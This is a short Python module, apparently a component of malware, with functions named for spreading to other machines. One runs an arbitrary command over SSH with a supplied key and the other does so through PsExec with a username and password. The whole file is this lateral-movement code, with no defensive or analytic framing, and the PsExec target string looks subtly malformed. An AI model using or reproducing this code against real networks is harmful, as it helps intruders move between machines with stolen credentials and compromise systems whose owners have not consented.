import platform
import subprocess


def spread_via_ssh(target_ip, username, key_path, command):
    try:
        subprocess.run(
            ["ssh", "-i", key_path, f"{username}@{target_ip}", command], check=True
        )
    except Exception as e:
        print(f"[!] SSH spread failed: {e}")


def spread_via_psexec(target, user, password, command):
    if platform.system() != "Windows":
        return
    try:
        subprocess.run(
            ["psexec", f"\\{target}", "-u", user, "-p", password, "cmd", "/c", command],
            check=True,
        )
    except Exception as e:
        print(f"[!] PsExec failed: {e}")
